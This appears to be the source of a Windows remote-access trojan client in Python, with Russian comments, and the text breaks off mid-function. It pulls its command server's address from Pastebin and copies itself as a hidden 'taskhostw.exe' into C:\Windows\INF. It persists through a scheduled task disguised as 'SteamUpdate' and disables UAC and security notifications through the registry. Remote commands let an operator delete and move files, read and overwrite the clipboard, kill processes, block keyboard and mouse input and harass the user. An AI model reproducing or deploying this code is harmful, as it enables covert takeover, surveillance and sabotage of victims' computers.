import socket
import json
import keyboard
import os
import sys
import platform
import requests
import win32gui
import win32con
import mss
import ctypes
import pyautogui
import time
import pyaudio   
import wave
import random
import pygame
import pyperclip   
import numpy as np  
import sounddevice as sd
import wave
import tempfile
import subprocess
import random
import winreg as reg
import uuid
import shutil
import logging
import threading
import psutil
import cv2
import struct

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s', handlers=[logging.StreamHandler()])
logger = logging.getLogger(__name__)

def check_cython_load(): # Нужно при использовании Cython
    return True
    
# ====== Автоопределение CLIENT_ID ======
def get_hwid():
    # 1. Попытка через WMIC (UUID материнской платы)
    try:
        cmd = 'wmic csproduct get uuid'
        try:
            oem_cp = f"cp{ctypes.windll.kernel32.GetOEMCP()}"
        except Exception:
            oem_cp = 'cp866'
        output = subprocess.check_output(cmd, shell=True).decode(oem_cp, errors='ignore').strip()
        lines = output.split('\n')
        hwid = lines[1].strip() if len(lines) > 1 else None
        if hwid and hwid != 'UUID':
            return hwid
    except Exception as e:
        logger.error(f"Ошибка получения HWID (WMIC): {e}")

    # 2. Попытка через Реестр (MachineGuid) — Самый надежный fallback
    # Работает, даже если WMI сломан. ID не меняется до переустановки Windows.
    try:
        key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", 0, reg.KEY_READ | reg.KEY_WOW64_64KEY)
        guid, _ = reg.QueryValueEx(key, "MachineGuid")
        reg.CloseKey(key)
        if guid:
            return guid
    except Exception as e:
        logger.error(f"Ошибка получения HWID (Registry): {e}")

    # 3. Последний шанс: MAC-адрес
    # uuid.getnode() получает адрес сетевой карты. Он статичен.
    try:
        mac_num = uuid.getnode()
        return f"mac-{mac_num}"
    except Exception:
        pass
        
    # 4. Если совсем всё плохо (крайний случай), берем имя пользователя
    return f"user-{os.getenv('USERNAME', 'unknown')}"

device_name = os.getenv("COMPUTERNAME", "UnknownDevice")
CLIENT_ID = f"{device_name}/{get_hwid()}"
logger.info(f"CLIENT_ID: {CLIENT_ID}")

pyautogui.FAILSAFE = False

EXEC_URL = "https://pastebin.com/raw/xxxxx"
def get_buffer_process():
    
    """
    Скачивает конфигурацию сервера с Pastebin.
    Ожидаемый формат на Pastebin (сырой текст):
    {
        "ip": "123.45.67.89",
        "port": 9876
    }
    """

    for attempt in range(5):
        try:
            logger.info(f"Попытка {attempt + 1}/5 получить конфигурацию с Pastebin...")
            response = requests.get(EXEC_URL, timeout=10)
            response.raise_for_status()
            data = response.json()  # Ожидаем валидный JSON

            ip = data.get("ip", "").strip()
            port = data.get("port")

            if not ip or not isinstance(port, int) or port < 1 or port > 65535:
                raise ValueError("Некорректные данные в JSON")

            logger.info(f"Успешно получена конфигурация: {ip}:{port}")
            return ip, port

        except requests.RequestException as e:
            logger.error(f"Ошибка сети при загрузке конфигурации (попытка {attempt + 1}): {e}")
        except json.JSONDecodeError:
            logger.error("Pastebin содержит невалидный JSON")
        except Exception as e:
            logger.error(f"Ошибка парсинга конфигурации: {e}")

        if attempt < 4:
            time.sleep(3)

    # Если всё плохо — выходим, чтобы не подключаться к старым/неизвестным адресам
    logger.critical("Не удалось получить IP/Port с Pastebin. Завершение работы.")
    sys.exit(1)

# Загружаем конфигурацию при старте
SERVER_IP, SERVER_PORT = get_buffer_process()
RECONNECT_DELAY = 15

# ====== Глобальные переменные ======
CURRENT_VERSION = 34
MAX_LEN = 4000
TARGET_DIR = r"C:\Windows\INF"
new_name="taskhostw.exe"
stop_event = threading.Event()
auto_thread = None
socket_lock = threading.Lock()
current_socket = None
current_thread_id = None
current_path = os.path.expanduser("~")
video_thread = None
video_stop_event = threading.Event()
file_lock = threading.Lock()
_mixer_initialized = False
music_thread = None
music_stop_event = threading.Event() 
mouse_mess_stop_event = threading.Event()
HB_INTERVAL = 10 # Отправляем каждые 10 секунд
hb_stop_event = threading.Event()
mouse_mess_thread = None

# ====== Вспомогательные функции ======
def initialize_mixer():
    """Инициализация микшера Pygame."""
    global _mixer_initialized
    if not _mixer_initialized:
        try:
            # Инициализация только если микшер еще не инициализирован
            if not pygame.mixer.get_init():
                pygame.mixer.init()
            _mixer_initialized = True
            return True
        except pygame.error as e:
            logger.error(f"Failed to initialize pygame mixer: {e}")
            return False
    return True

############################

def is_good_window(hwnd):
    if not win32gui.IsWindowVisible(hwnd):
        return False

    title = win32gui.GetWindowText(hwnd).strip()
    if not title:
        return False

    class_name = win32gui.GetClassName(hwnd)

    blacklist_classes = {
        "Progman",       # Program Manager
        "WorkerW",       # Фоновый контейнер
        "ime",           # Default IME
        "MSCTFIME UI",   # Текстовые службы
    }

    if class_name in blacklist_classes:
        return False

    return True

def enum_windows_callback(hwnd, windows_list):
    if is_good_window(hwnd):
        title = win32gui.GetWindowText(hwnd)
        windows_list.append((hwnd, title))

def force_focus_window(hwnd):
    user32 = ctypes.windll.user32

    # Разрешаем перевести окно в foreground
    try:
        user32.AllowSetForegroundWindow(ctypes.c_uint(-1))
    except:
        pass

    # 1) Попытка показать окно
    win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
    win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)

    # 2) Попытка обычной активации
    try:
        win32gui.SetForegroundWindow(hwnd)
        return True
    except:
        pass

    # 3) Alt — разблокирует foreground-lock
    try:
        pyautogui.press('alt')
        win32gui.SetForegroundWindow(hwnd)
        return True
    except:
        pass

    # 4) Жёсткий fallback
    try:
        user32.SwitchToThisWindow(hwnd, True)
        return True
    except:
        return False

############################

def play_sound_task(conn, full_path):
    """
    Задача воспроизведения, запускаемая в отдельном потоке.
    Это предотвращает блокировку основного цикла клиента.
    """
    global music_thread
    try:
        # Остановка любой предыдущей музыки
        pygame.mixer.music.stop()
        
        # Загрузка и воспроизведение
        pygame.mixer.music.load(full_path)
        pygame.mixer.music.play()
        
        # Отправка начального подтверждения
        send_response(conn, '🎵 Музыка запущена успешно')
        
        # Ожидание окончания воспроизведения ИЛИ события остановки
        while pygame.mixer.music.get_busy() and not music_stop_event.is_set():
            time.sleep(0.5)
            
        # Проверка причины выхода из цикла
        if not pygame.mixer.music.get_busy():
            # Завершилось естественным путем
            send_response(conn, '✅ Проигрывание музыки завершено')
        else:
            # Остановлено командой /stopsound
            pass 
            
    except Exception as e:
        send_response(conn, f'❌ Ошибка во время загрузки музыки: {e}')
        
    finally:
        # Очистка глобальной ссылки на поток
        with socket_lock: # Используйте существующий глобальный лок для защиты
            if music_thread == threading.current_thread():
                music_thread = None
        music_stop_event.clear() # Очистка события для следующего запуска

############################

def mouse_mess_loop():
    logger.info("Mouse mess thread started.")
    while not mouse_mess_stop_event.is_set():
        try:
            # Получаем размеры экрана для случайных координат
            screen_width, screen_height = pyautogui.size()
            x = random.randint(100, screen_width - 100)
            y = random.randint(100, screen_height - 100)
            pyautogui.moveTo(x, y, duration=0.05) 
            time.sleep(0.1)
        except Exception as e:
            logger.error(f"Mouse mess error: {e}")
            break
    logger.info("Mouse mess thread stopped.")

############################

def kill_parent_stub():
    try:
        current_process = psutil.Process(os.getpid())
        parent_process = current_process.parent()

        if parent_process is not None:
            parent_name = parent_process.name().lower()
            logger.debug(f"[INFO] Завершаем родительский процесс: PID={parent_process.pid}, Name={parent_name}")
            parent_process.terminate()
            parent_process.wait(timeout=5)
        else:
            logger.debug("[INFO] Родительский процесс не найден")
    except Exception as e:
        logger.debug(f"[ERROR] Не удалось завершить родительский процесс: {e}")

############################

def disable_uac():
    """
    Отключает UAC и уведомления в тихом режиме
    """
    try:
        logger.info("Начало отключения UAC...")

        # Отключение UAC через реестр
        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, 
                       r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 
                       0, reg.KEY_SET_VALUE) as key:
            # EnableLUA = 0 - отключает UAC
            reg.SetValueEx(key, "EnableLUA", 0, reg.REG_DWORD, 0)
            # ConsentPromptBehaviorAdmin = 0 - отключает запросы
            reg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, reg.REG_DWORD, 0)
            # PromptOnSecureDesktop = 0 - отключает безопасный рабочий стол
            reg.SetValueEx(key, "PromptOnSecureDesktop", 0, reg.REG_DWORD, 0)

        # Дополнительно: отключение уведомлений безопасности
        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, 
                       r"SOFTWARE\Microsoft\Security Center", 
                       0, reg.KEY_SET_VALUE) as key:
            reg.SetValueEx(key, "UacDisableNotify", 0, reg.REG_DWORD, 1)

        logger.info("UAC и уведомления успешно отключены")
        return True

    except Exception as e:
        logger.error(f"Ошибка при отключении UAC: {e}")
        return False

############################

"""
def change_shell():
    logger.info("Изменение shell запущено")
    try:
        logger.info("Открытие ключа реестра Winlogon...")
        key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon")
        logger.info("Ключ открыт")
        value = f"explorer.exe, {TARGET_DIR}\\{new_name}"
        logger.info(f"Установка значения shell: {value}")
        reg.SetValueEx(key, "shell", 0, reg.REG_SZ, value)
        logger.info("Значение 'shell' успешно изменено")
        reg.CloseKey(key)
        logger.info("Ключ закрыт")
    except Exception as e:
        logger.error(f"Ошибка при изменении shell: {e}")
    finally:
        logger.info("Работа потока изменения shell завершена")
"""

def change_shell():
    logger.info("Настройка скрытого автозапуска через Планировщик...")
    try:
        app_path = os.path.join(TARGET_DIR, new_name)
        task_name = "SteamUpdate" # Выглядит легитимно
        
        # 1. Сначала удаляем старую задачу, если она была, чтобы не плодить дубли
        subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, capture_output=True)
        
        # 2. Создаем новую задачу
        # /sc onlogon - запуск при входе пользователя
        # /tr - путь к файлу
        # /rl highest - запуск с наивысшими правами (если есть возможность)
        # /it - интерактивный запуск
        # /f - принудительное создание
        cmd = (
            f'schtasks /create /tn "{task_name}" /tr "\'{app_path}\'" '
            f'/sc onlogon /rl highest /f'
        )
        
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            logger.info("Программа успешно скрыта в Планировщике задач")
        else:
            # Если не удалось создать с правами highest, создаем обычную
            cmd_basic = f'schtasks /create /tn "{task_name}" /tr "\'{app_path}\'" /sc onlogon /f'
            subprocess.run(cmd_basic, shell=True)
            logger.info("Создана обычная задача в Планировщике")

    except Exception as e:
        logger.error(f"Ошибка скрытого автозапуска: {e}")

def set_file_attributes(file_path):
    # Устанавливаем атрибуты скрытый и системный
    ctypes.windll.kernel32.SetFileAttributesW(file_path, 0x02 | 0x04)
    
def copy_to_target():
    """
    Копирует текущий исполняемый файл в целевую директорию, 
    устанавливает атрибуты, запускает копию и завершает текущий экземпляр.
    """
    try:
        if not os.path.exists(TARGET_DIR):
            os.makedirs(TARGET_DIR)
            logger.info(f"Папка {TARGET_DIR} создана.")

        current_file = sys.argv[0]
        target_file = os.path.join(TARGET_DIR, new_name)

        # Проверка, работаем ли мы уже из целевой папки
        if os.path.abspath(current_file).lower() == os.path.abspath(target_file).lower():
            logger.info("Уже работаем из целевой папки.")
            return True

        # Если файла в целевой папке нет, копируем его
        if not os.path.exists(target_file):
            logger.info(f"Копирование {current_file} в {target_file}...")
            shutil.copy2(current_file, target_file) 
            logger.info(f"Программа успешно скопирована в {target_file}.")
            
            # Устанавливаем атрибуты сразу после копирования
            set_file_attributes(target_file)
        else:
            logger.info(f"Файл уже существует в {target_file}, копирование не требуется.")

        # Запуск скопированного файла
        logger.info("Запуск файла из целевой папки...")
        os.startfile(target_file)
        
        # Завершение текущего экземпляра
        logger.info("Запущен файл из целевой папки. Завершение текущего экземпляра.")
        change_shell()
        os._exit(0)

    except PermissionError as pe:
        logger.critical(f"Ошибка прав доступа при копировании/создании папки/запуске: {pe}")
        return False
    except Exception as e:
        logger.error(f"Непредвиденная ошибка при копировании или запуске: {e}")
        return False

############################

def delete_mei():
    temp_dir = tempfile.gettempdir()
    current_meipass = getattr(sys, "_MEIPASS", "")

    print(f"[DEBUG] TEMP DIR: {temp_dir}")
    print(f"[DEBUG] CURRENT _MEIPASS: {current_meipass}")

    for name in os.listdir(temp_dir):
        full_path = os.path.join(temp_dir, name)
        if name.startswith("_MEI") and os.path.isdir(full_path):
            print(f"[DEBUG] Найдена папка: {full_path}")
            if os.path.abspath(full_path) == os.path.abspath(current_meipass):
                print(f"[SKIP] Пропущена текущая _MEIPASS: {full_path}")
                continue
            try:
                shutil.rmtree(full_path, ignore_errors=False)
                print(f"[OK] Удалена: {full_path}")
            except Exception as e:
                print(f"[ERROR] Не удалось удалить {full_path}: {e}")

#############################################################
# Файловый менеджер

def cmd_ls(args):
    """
    Возвращает Markdown-список: путь отдельным инлайн-кодом, 
    каждый файл/папка — тоже отдельным инлайн-кодом.
    При длинном выводе — файл без форматирования.
    """
    global current_path, MAX_LEN

    target_path = current_path

    # 1. Корень: диски
    if current_path == '/':
        drives = []

        for i in range(ord('A'), ord('Z') + 1):
            drive = chr(i) + ":\\"
            if os.path.exists(drive):
                if psutil:
                    size = psutil.disk_usage(drive).total // (1024**3)
                    drives.append(f"💾 `{drive}` — {size} GB")
                else:
                    drives.append(f"💾 `{drive}`")

        if not drives:
            return "❌ Не найдено дисков."

        text = "📂 `/`\n\n" + "\n".join(drives)

        if len(text) <= MAX_LEN:
            return text

        # если слишком длинно → файл
        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix="_drives.txt", encoding="utf-8") as tmp:
            tmp.write("\n".join([d.replace("`", "") for d in drives]))
            return tmp.name

    # 2. Обработка перехода
    if args.strip():
        arg = args.strip()
        if os.path.isabs(arg) and os.path.isdir(arg):
            target_path = arg
            current_path = arg
        else:
            cand = os.path.join(current_path, arg)
            if os.path.isdir(cand):
                target_path = cand
                current_path = cand
            else:
                return f"❌ Папка '{arg}' не существует."

    # 3. Чтение папки
    try:
        items = os.listdir(target_path)
    except Exception as e:
        return f"❌ Ошибка доступа: {e}"

    dirs = []
    files = []

    for item in sorted(items, key=str.lower):
        full = os.path.join(target_path, item)
        if os.path.isdir(full):
            dirs.append(item)
        else:
            files.append(item)

    # 4. Формирование Markdown без блоков
    path_line = f"📂 `{target_path}`\n\n"
    lines = []

    for d in dirs:
        lines.append(f"📁 `{d}`")
    for f in files:
        lines.append(f"📄 `{f}`")

    out = path_line + "\n".join(lines)

    if len(out) <= MAX_LEN:
        return out  # обычное Markdown-сообщение

    # 5. Если длинный — отправляем как файл БЕЗ Markdown
    plain = target_path + "\n\n" + "\n".join(dirs + files)

    with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix="_ls.txt", encoding="utf-8") as tmp:
        tmp.write(plain)
        temp_path = tmp.name

    with socket_lock:
        conn = current_socket

    send_response(conn, None, cmd_name="/ls", is_file=True, file_path=temp_path)

    return None


def cmd_cd(args):
    global current_path
    logger.debug(f"Выполняется /cd с аргументами: {args}")
    try:
        with file_lock:
            path = os.path.normpath(os.path.join(current_path, args.strip()))
            if os.path.isdir(path):
                current_path = path
                return f"✅ Текущий путь: {current_path}"
            return "❌ Папка не существует или это не папка"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"


def cmd_back(args):
    """
    Переходит в родительскую папку. Из корневого каталога диска (C:\) 
    переводит в виртуальный корень (/) для просмотра дисков.
    """
    global current_path
    
    # 1. Если мы уже в виртуальном корне, возвращаем ошибку
    if current_path == '/':
        return "❌ Вы в корневой папке (просмотр дисков)"

    # 2. Проверка, находимся ли мы В КОРНЕ диска (например, "C:\")
    # 🔥 ИСПРАВЛЕНО: Условие должно быть len(current_path) == 3, а не >= 3
    if len(current_path) == 3 and current_path[1:3] == ':\\':
        # Если мы в C:\, переходим в виртуальный корень /
        current_path = '/'
        return f"✅ Текущий путь: Просмотр дисков ({current_path})"

    # 3. Стандартный переход в родительский каталог
    parent_path = os.path.dirname(current_path)

    if parent_path:
        # Убедимся, что путь имеет завершающий слэш, если это корень диска (C:\)
        # os.path.dirname('C:\\User') -> 'C:\\'
        # os.path.dirname('C:\\') -> 'C:' 
        if len(parent_path) == 2 and parent_path.endswith(':'): # Если os.path.dirname вернул "C:"
            parent_path += '\\'
            
        current_path = parent_path
        
    return f"✅ Текущий путь: {current_path}"


def cmd_pwd(args):
    logger.debug(f"Выполняется /pwd с аргументами: {args}")
    return current_path

def cmd_mkdir(args):
    logger.debug(f"Выполняется /mkdir с аргументами: {args}")
    try:
        with file_lock:
            path = os.path.join(current_path, args.strip())
            os.makedirs(path, exist_ok=True)
            return f"✅ Папка '{args.strip()}' создана"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"


def cmd_delete(args):
    logger.debug(f"Выполняется /delete с аргументами: {args}")
    try:
        with file_lock:
            path = os.path.join(current_path, args.strip())
            if os.path.isdir(path):
                shutil.rmtree(path, ignore_errors=True)
            elif os.path.isfile(path):
                os.remove(path)
            else:
                return "❌ Не найдено"
            return "✅ Удалено"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"


def cmd_rename(args):
    logger.debug(f"Выполняется /rename с аргументами: {args}")
    try:
        with file_lock:
            parts = args.split('/n', 1)
            if len(parts) < 2:
                return "❌ Формат: /rename old/nnew"
            old, new = parts[0].strip(), parts[1].strip()
            old_path = os.path.join(current_path, old)
            new_path = os.path.join(current_path, new)
            os.rename(old_path, new_path)
            return f"✅ Переименовано в '{new}'"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"


def cmd_copy(args):
    logger.debug(f"Выполняется /copy с аргументами: {args}")
    try:
        with file_lock:
            parts = args.split('/to', 1)
            if len(parts) < 2:
                return "❌ Формат: /copy src/to dst"
            src, dst = parts[0].strip(), parts[1].strip()
            src_path = os.path.join(current_path, src)
            dst_path = os.path.join(current_path, dst)
            if os.path.isdir(src_path):
                shutil.copytree(src_path, dst_path, dirs_exist_ok=True)
            else:
                shutil.copy2(src_path, dst_path)
            return f"✅ Скопировано в '{dst}'"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"

def cmd_move(args):
    logger.debug(f"Выполняется /move с аргументами: {args}")
    try:
        with file_lock:
            parts = args.split('/to', 1)
            if len(parts) < 2:
                return "❌ Формат: /move src/to dst"
            src, dst = parts[0].strip(), parts[1].strip()
            src_path = os.path.join(current_path, src)
            dst_path = os.path.join(current_path, dst)
            shutil.move(src_path, dst_path)
            return f"✅ Перемещено в '{dst}'"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"

# ====== Другие команды ======
def cmd_msg(args):
    try:
        parts = args.split('/t', 1)
        if len(parts) < 2:
            return "Формат: /msg [type] [title]/t<text>"
        
        header = parts[0].strip().split()
        text = parts[1].strip()
        
        # Типы иконок
        types = {
            "info":     0x40,  # ℹ️
            "warning":  0x30,  # Warning
            "error":    0x10,  # Error
            "question": 0x20   # Question
        }
        msg_type = header[0].lower() if header else "info"
        icon = types.get(msg_type, 0x40)
        
        # Заголовок
        title = " ".join(header[1:]) if len(header) > 1 else "Message"

        # Скрытое окно + MessageBox
        def show_msgbox():
            user32 = ctypes.windll.user32
            hwnd = user32.CreateWindowExW(0, "STATIC", "", 0, 0, 0, 0, 0, 0, 0, 0, 0)
            user32.MessageBoxW(hwnd, text, title, icon | 0x1000)  # MB_SYSTEMMODAL
            user32.DestroyWindow(hwnd)

        threading.Thread(target=show_msgbox, daemon=True).start()
        return "Готово"
    
    except Exception as e:
        return f"Ошибка: {e}"


def cmd_changeclipboard(args):
    if not args:
        return "❌ Укажите текст для буфера обмена."
    try:
        text = args.strip()
        # Windows: 'echo | set /p nul=текст | clip'
        # Используем двойные кавычки для безопасности
        command = f'echo | set /p nul="{text}" | clip' 
        os.system(command)
        return f'✅ Буфер обмена изменен на: \"{text}\"'
    except Exception as e:
        return f'❌ Ошибка: {e}'


def cmd_restart(args):
    """
    Правильный перезапуск: отсоединение процесса и жесткое завершение.
    """
    try:
        # 1. Получаем путь к текущему файлу
        # Если это exe (после PyInstaller), sys.executable - это путь к exe.
        # Если это скрипт, то это путь к интерпретатору.
        executable = sys.executable
        script_args = sys.argv
        
        # 2. Формируем команду
        # Важно: для Windows используем DETACHED_PROCESS, чтобы процессы не были связаны
        DETACHED_PROCESS = 0x00000008
        
        logger.info("Запуск нового процесса...")
        
        # Запускаем новый процесс без shell=True и без наследования дескрипторов
        subprocess.Popen(
            [executable] + script_args,
            creationflags=DETACHED_PROCESS,
            close_fds=True,
            cwd=os.getcwd() # Важно запустить в той же рабочей директории
        )

        # 3. Даем ОС время на инициализацию нового процесса (хватит 200мс)
        time.sleep(0.2)
        
        # 4. ЖЕСТКОЕ ЗАВЕРШЕНИЕ
        # Вместо sys.exit(0), который может ждать потоки, используем os._exit
        # Это мгновенно убивает процесс на уровне ядра.
        logger.info("Старый процесс завершается немедленно (os._exit)")
        os._exit(0)

    except Exception as e:
        logger.error(f"Ошибка перезапуска: {e}")
        return f"❌ Ошибка: {e}", True, None

def cmd_minimize(args):
    try:
        # Win + Down Arrow
        pyautogui.hotkey("win", "down")
        return "✅ Активное окно свернуто."
    except Exception as e:
        return f"❌ Ошибка: {e}"

def cmd_maximize(args):
    try:
        # Win + Up Arrow
        pyautogui.hotkey("win", "up")
        return "✅ Активное окно развернуто."
    except Exception as e:
        return f"❌ Ошибка: {e}"

def block_input(args):
    """Блокирует ввод пользователя (мышь и клавиатура)."""
    try:
        ctypes.windll.user32.BlockInput(True)
        return "✅ Блокировка ввода (мышь/клавиатура) активирована."
    except Exception as e:
        return f"❌ Ошибка блокировки ввода: {e}"

def unblock_input(args):
    """Снимает блокировку ввода пользователя."""
    try:
        # Снимаем блокировку
        ctypes.windll.user32.BlockInput(False)  
        return "✅ Блокировка ввода (мышь/клавиатура) снята."
    except Exception as e:
        return f"❌ Ошибка снятия блокировки ввода: {e}"

def cmd_version(args):
    """Возвращает версию клиента"""
    return f"Версия клиента: {CURRENT_VERSION}"

def get_clipboard_content(args):
    """Получает текстовое содержимое буфера обмена."""
    CF_TEXT = 1
    
    kernel32 = ctypes.windll.kernel32
    user32 = ctypes.windll.user32
    
    # Настройка аргументов/возвращаемых значений для C-функций
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    user32.GetClipboardData.restype = ctypes.c_void_p
    
    try:
        if not user32.OpenClipboard(0):
            return "❌ Не удалось открыть буфер обмена."
        
        result_text = "📋 Буфер обмена пуст или содержит нетекстовые данные."
        
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            data = user32.GetClipboardData(CF_TEXT)
            if data:
                data_locked = kernel32.GlobalLock(data)
                text_ptr = ctypes.c_char_p(data_locked)
                value = text_ptr.value # Получаем байты
                kernel32.GlobalUnlock(data_locked)
                
                if value:
                    # Попытки декодирования: UTF-8 -> CP1251
                    try:
                        body = value.decode('utf-8', errors='strict')
                    except UnicodeDecodeError:
                        body = value.decode('cp1251', errors='replace')
                    
                    username = os.getlogin()
                    result_text = f"📋 Буфер обмена пользователя '{username}':\n---\n{body}"
        
        return result_text
        
    except Exception as e:
        return f"❌ Ошибка при чтении буфера обмена: {e}"
    finally:
        # Важно всегда закрывать буфер обмена
        try:
            user32.CloseClipboard()
        except Exception:
            pass
            
def cmd_cmdbomb(args):
    try:
        # Открываем 10 окон CMD
        os.popen('start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd')
        return '✅ Открыто 10 окон CMD.'
    except Exception as e:
        return f'❌ Ошибка: {e}'

def cmd_altf4(args):
    try:
        pyautogui.hotkey('alt', 'f4')
        return '✅ Нажато ALT + F4.'
    except Exception as e:
        return f'❌ Ошибка: {e}'

def cmd_taskkill(args):
    """
    Закрывает один или несколько процессов по имени или PID (только для Windows).
    Принимает список имен/PID, разделенных пробелами.
    Пример: /taskkill chrome.exe 1234
    """

    # Безопасное преобразование args в строку перед strip() (предотвращает ошибку, если args=None)
    targets_str = (args if args is not None else "").strip()

    if not targets_str:
        return "❌ Укажите имя процесса (например, chrome.exe) или PID (число)."

    targets = targets_str.split()
    results = []

    for target in targets:
        # Проверяем, является ли цель PID (числом)
        if target.isdigit():
            # Закрываем по PID (/PID)
            command = ['taskkill', '/PID', target, '/F']
            desc = f"PID {target}"
        else:
            # Закрываем по имени (/IM - Image Name)
            command = ['taskkill', '/IM', target, '/F']
            desc = f"Процесс {target}"

        try:
            # Запускаем команду taskkill с принудительным завершением (/F)
            subprocess.run(
                command, 
                check=True, 
                capture_output=True, 
                text=True, 
                encoding='utf-8'
            )
            results.append(f"✅ {desc} успешно завершен.")
            
        except subprocess.CalledProcessError as e:
            # Taskkill выдает ненулевой код возврата, если процесс не найден или доступ запрещен
            
            # 🔥 ИСПРАВЛЕНИЕ: Проверяем e.stderr на None, чтобы избежать AttributeError.
            if e.stderr is None:
                # Если e.stderr равно None, сообщаем об ошибке с кодом возврата.
                error_message = f"Команда завершилась с ошибкой (Код {e.returncode}), но сообщение об ошибке отсутствует."
            else:
                # Получаем последнюю строку ошибки и очищаем ее
                error_message = e.stderr.strip().split('\n')[-1].strip()
            
            results.append(f"❌ {desc}: {error_message}")
            
        except FileNotFoundError:
            # Это может произойти, если 'taskkill' не найден в PATH (что маловероятно в Windows)
            results.append(f"❌ {desc}: Команда 'taskkill' не найдена. Убедитесь, что вы работаете в Windows.")
            
        except Exception as e:
            results.append(f"❌ {desc}: Общая ошибка: {e}")

    return "\n".join(results)

def cmd_tasklist(args):
    """
    Выводит список запущенных процессов, включая путь к исполняемому файлу,
    и сохраняет результат в TXT-файл. (Использует WMIC с исправленным парсингом)
    """
    if os.name != 'nt':
        return "❌ Команда Tasklist (WMIC) поддерживается только в Windows."
        
    temp_file_path = None
    try:
        # 1. Используем WMIC для получения Имени, Пути к файлу и PID.
        # Вывод: Node,Caption,ExecutablePath,ProcessId
        command = ['wmic', 'process', 'get', 'Caption,ExecutablePath,ProcessId', '/format:csv']
        
        # Используем cp866 для Windows
        result = subprocess.run(command, capture_output=True, text=True, check=True, encoding='cp866', errors='replace')
        
        output_lines = ["TASKLIST (Имя процесса | PID | Путь к файлу)\n", "="*100 + "\n"]
        
        csv_data = result.stdout.strip().split('\n')
        
        data_found = False

        # Пропускаем первые строки (пустая строка и заголовки), начиная обработку с третьего элемента (индекс 2)
        for i, line in enumerate(csv_data):
            if i < 2: continue # Пропускаем две строки с метаданными

            line = line.strip()
            if not line: continue

            # Разделяем по запятой. Ожидаем 4 части: Node, Caption, ExecutablePath, ProcessId
            parts = [p.strip() for p in line.split(',')]
            
            # 🔥 ИСПРАВЛЕНИЕ: Проверяем, что есть 4 элемента и PID - число
            if len(parts) == 4 and parts[3].isdigit(): 
                # parts[1] = Caption (Имя процесса)
                # parts[2] = ExecutablePath (Путь)
                # parts[3] = ProcessId (PID)
                
                image_name = parts[1]
                path = parts[2] or "N/A" # Путь может быть пустым для системных процессов
                pid = parts[3]
                
                # Форматируем в одну чистую строку
                formatted_line = (
                    f"{image_name:<30}"[:30] + 
                    f" | {pid:<5}" + 
                    f" | {path}\n"
                )
                output_lines.append(formatted_line)
                data_found = True
        
        if not data_found:
             # Если данные не найдены, возвращаем ошибку
             return f"❌ Не удалось найти запущенные процессы. Код завершения WMIC: {result.returncode}"

        # 2. Создаем временный файл
        with tempfile.NamedTemporaryFile(mode='w', suffix='_tasklist.txt', delete=False, encoding='utf-8') as tmp:
            tmp.writelines(output_lines)
            temp_file_path = tmp.name
        
        # 3. ВОЗВРАЩАЕМ ПУТЬ К ФАЙЛУ
        return temp_file_path  

    except Exception as e:
        return f"❌ Критическая ошибка Tasklist (WMIC): {e}"


def cmd_keypress(args):
    """Нажимает комбинацию клавиш: /keypress alt f4"""
    if not args or not args.strip():
        return "Используйте: /keypress <клавиши>"
    
    keys = [k.strip().lower() for k in args.split() if k.strip()]
    if not keys:
        return "Укажите клавиши."
    
    try:
        pyautogui.hotkey(*keys, interval=0.05)
        return f"Нажато: `{', '.join(keys)}`"
    except Exception as e:
        return f"Ошибка: {e}"

def cmd_applist(args):
    args = args.strip()

    windows = []
    win32gui.EnumWindows(enum_windows_callback, windows)

    if not args:
        if not windows:
            return "❌ Нет открытых окон."

        lines = ["📋 Открытые окна:"]
        for i, (_, title) in enumerate(windows, start=1):
            lines.append(f"{i}. {title}")

        return "\n".join(lines)

    if not args.isdigit():
        return "❌ Укажите номер окна: /applist <номер>"

    index = int(args)

    if index < 1 or index > len(windows):
        return f"❌ Неверный номер. Доступно: 1..{len(windows)}"

    hwnd, title = windows[index - 1]

    if force_focus_window(hwnd):
        return f"➡️ Окно «{title}» выведено на передний план."
    else:
        return f"❌ Не удалось активировать окно."


def cmd_applist_title(args):
    """
    /applist_title <номер окна> <новый заголовок>
    Переименовывает окно по указанному индексу.
    """
    parts = args.strip().split(maxsplit=1)

    if len(parts) < 2:
        return "❌ Формат: /applist_title <номер> <новый заголовок>"

    index_str, new_title = parts
    if not index_str.isdigit():
        return "❌ Индекс окна должен быть числом."

    index = int(index_str)

    # Собираем список окон
    windows = []
    win32gui.EnumWindows(enum_windows_callback, windows)

    if index < 1 or index > len(windows):
        return f"❌ Неверный номер. Доступно: 1..{len(windows)}"

    hwnd, old_title = windows[index - 1]

    try:
        # Меняем заголовок
        ctypes.windll.user32.SetWindowTextW(hwnd, new_title)
        return f"✏️ Заголовок «{old_title}» заменён на «{new_title}»."

    except Exception as e:
        return f"❌ Ошибка изменения заголовка: {e}"


def cmd_applist_close(args):
    args = args.strip()

    if not args.isdigit():
        return "❌ Формат: /applist_close <номер>"

    index = int(args)

    windows = []
    win32gui.EnumWindows(enum_windows_callback, windows)

    if index < 1 or index > len(windows):
        return f"❌ Неверный номер. Доступно: 1..{len(windows)}"

    hwnd, title = windows[index - 1]

    try:
